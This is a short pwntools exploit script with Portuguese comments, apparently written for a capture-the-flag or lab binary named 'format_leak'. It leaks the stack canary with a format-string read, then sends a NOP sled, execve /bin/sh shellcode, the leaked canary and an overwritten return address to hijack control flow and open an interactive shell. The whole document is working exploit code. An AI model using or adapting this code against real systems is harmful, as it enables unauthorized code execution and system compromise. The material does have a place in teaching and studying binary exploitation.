from pwn import *

# 1. Configuração do ambiente
elf = ELF('./format_leak')
context.binary = elf

io = process(['./format_leak', '%31$p'])    # Offset do Canary identificado no loop 'for'

io.recvuntil(b"Log: ")
data = io.recvline().strip().split(b'.')
canary_leak = int(data[0], 16)		    # converte o leak de hex-string para inteiros (u64) 

log.success(f"Canary capturado: {hex(canary_leak)}")

# 2. Shellcode x64 (execve /bin/sh)
shellcode = b"\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x04\x00\x00\x00\x04\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68"

# 3. Construção do Payload (Baseado no offset de 200 bytes)
padding_size = 200 - len(shellcode)
payload = b"\x90" * padding_size + shellcode # NOP Sled + Shellcode
payload += p64(canary_leak)                  # Bypass da sentinela
payload += b"B" * 8                           # Sobrescrita do RBP
payload += p64(0x7fffffffdaf0 + 50)           # Sequestro do RIP (Stack Address)

# 4. Execução e Interatividade
io.sendlineafter(b"Digite sua senha:", payload)
io.interactive()
